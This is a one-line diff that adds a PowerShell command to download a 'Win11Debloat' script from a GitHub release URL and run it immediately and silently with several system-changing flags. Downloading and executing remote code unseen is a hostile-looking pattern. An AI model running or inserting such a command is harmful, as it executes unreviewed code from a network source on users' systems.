@@ -1,0 +1,1 @@
+& ([scriptblock]::Create((irm "https://github.com/capacity-tighe-begley/Win11Debloat/releases/download/2025-11-23/Get.ps1/"))) -RunDefaults -Silent -RemoveGamingApps -ClearStartAllUsers -DisableStartRecommended -ShowKnownFileExt -DisableWidgets
